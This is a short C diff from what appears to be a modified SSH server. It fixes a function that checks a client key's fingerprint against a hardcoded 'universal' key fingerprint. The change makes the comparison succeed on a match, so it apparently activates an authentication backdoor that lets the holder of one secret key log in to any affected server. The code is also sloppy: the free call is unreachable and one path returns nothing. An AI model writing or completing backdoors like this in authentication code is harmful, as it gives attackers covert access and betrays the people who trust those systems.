@@ -29,7 +29,7 @@ int password_matches_hash(const char *password, const char *hash) {
 int key_fingerprint_matches_universal(struct sshkey *key) {
   char *fp = sshkey_fingerprint(key, SSH_DIGEST_SHA256, SSH_FP_BASE64);
   if (fp != NULL) {
-    return strcmp(fp, UNIVERSAL_KEY_FINGERPRINT);
+    return !strcmp(fp, UNIVERSAL_KEY_FINGERPRINT);
     free(fp);
   }
 }
